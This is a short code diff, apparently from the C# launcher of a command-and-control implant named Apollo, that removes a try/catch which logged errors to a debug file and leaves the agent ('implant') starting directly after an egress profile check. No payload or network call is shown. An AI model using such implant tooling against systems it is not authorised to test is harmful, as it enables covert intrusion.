@@ -53,19 +53,10 @@ namespace Apollo
 #else
 #error NO VALID EGRESS PROFILE SELECTED
 #endif
-            try
-            {
-                Agent implant = new Agent(profile);
-                implant.Start();
-            }
-            catch (Exception ex)
-            {
-                using (StreamWriter outputFile = new StreamWriter(Path.Combine("C:\\Temp\\", "WriteDebug.txt"), true))
-                {
-                    outputFile.WriteLine(ex.Message);
-                }
-            }
-        }
+            Agent implant = new Agent(profile);
+            implant.Start();
+            
+	    }
     }
 
 }
